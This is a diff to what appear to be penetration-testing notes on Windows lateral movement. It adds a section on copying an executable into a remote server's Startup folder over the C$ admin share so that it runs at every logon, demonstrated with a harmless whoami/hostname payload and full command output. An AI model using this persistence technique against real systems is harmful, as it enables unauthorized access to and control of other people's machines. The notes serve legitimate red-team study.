@@ -1,6 +1,6 @@
 
 ========================================================================================================================
-Lateral movement using native commands (WMIC, PowerShell Remoting, Schtasks, RDP) 
+Lateral movement using native commands (WMIC, PowerShell Remoting, Schtasks, Remote File Access, RDP) 
 ========================================================================================================================
 
 Requirement: 
@@ -11,7 +11,8 @@ Index
 1. Powershell Remoting
 2. WMIC
 3. Scheduled task (native command 'schtasks') + Powershell reverse shell
-4. RDP
+4. Remote file access 
+5. RDP
 
 
 ========================================================================================================================
@@ -213,3 +214,98 @@ win-server01
 
 PS C:\Windows\system32> whoami
 nt authority\system
+
+========================================================================================================================
+Example 4 - Remote File Access to C$ + Upload of an executbale file in the startup folder
+========================================================================================================================
+
+We can copy a 'malicious' executable file and drop it in the Startup folder, so that it executes every time a user logs in as a user.
+> Startup folder: \\REMOTE-COMPUTER-NAME\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
+
+
+Step 1. We start locally a powershell session with an account that has local admin privileges over the remote target Windows server
+------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator> runas /noprofile /netonly /user:administrator powershell
+Enter the password for administrator:
+Attempting to start powershell as user "server1\administrator" ...
+PS C:\Users\Administrator>
+
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\WINDOWS\system32> ls \\192.168.1.64\C$\
+
+    Directory: \\192.168.1.64\C$
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        19/10/2021     05:43                inetpub
+d-----        22/08/2013     17:52                PerfLogs
+d-r---        08/10/2017     21:33                Program Files
+d-----        08/10/2017     21:56                Program Files (x86)
+d-r---        27/07/2022     10:05                Users
+d-----        06/08/2022     19:17                Windows
+-a----        25/07/2022     09:57              0 SYSTEM
+
+PS C:\WINDOWS\system32>
+
+
+Step 2. We create our 'malicious' executable file (basic PoC/example)
+----------------------------------------------------------------------
+
+PS C:\WINDOWS\system32> echo "cmd /c whoami >> C:\Users\Public\test.txt" > C:\temp\launcher.bat
+PS C:\WINDOWS\system32> echo "cmd /c hostname >> C:\Users\Public\test.txt" >> C:\temp\launcher.bat
+
+=> Then we use the tool 'bat2exe.exe' to covert the batch script 'launcher.bat' into an executable file 'launcher.exe'
+
+
+Step 3. We copy our 'malicious' executable file into the Startup folder of the remote target Windows server
+------------------------------------------------------------------------------------------------------------
+
+PS C:\WINDOWS\system32> xcopy C:\temp\launcher.exe "\\192.168.1.64\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.exe"
+Does \\192.168.1.64\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\temp\launcher.exe
+1 File(s) copied
+
+
+PS C:\WINDOWS\system32> ls "\\192.168.1.64\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+    Directory: \\192.168.1.64\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        26/08/2022     01:59         129398 launcher.exe
+
+
+Step 4. Now each time an account will log into the remote target Windows server, the file 'launcher.exe' will be exectuted.
+---------------------------------------------------------------------------------------------------------------------------
+
+As a PoC when I logged (RDP) with the accounts 'Administrator' and 'Pentester' on the target Windows server, the executable file 'launcher.exe' was executed .
+
+PS C:\WINDOWS\system32> ls "\\192.168.1.64\C$\Users\Public\"
+
+    Directory: \\192.168.1.64\C$\Users\Public
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---        30/07/2020     13:51                Documents
+d-r---        22/08/2013     17:39                Downloads
+d-r---        22/08/2013     17:39                Music
+d-r---        22/08/2013     17:39                Pictures
+d-r---        22/08/2013     17:39                Videos
+-a----        25/08/2022     18:34             72 test.txt
+
+
+PS C:\WINDOWS\system32> cat "\\192.168.1.64\C$\Users\Public\test.txt"
+temp-sqldb\pentester
+TEMP-SQLDB
+temp-sqldb\administrator
+TEMP-SQLDB
+
+PS C:\WINDOWS\system32>
+
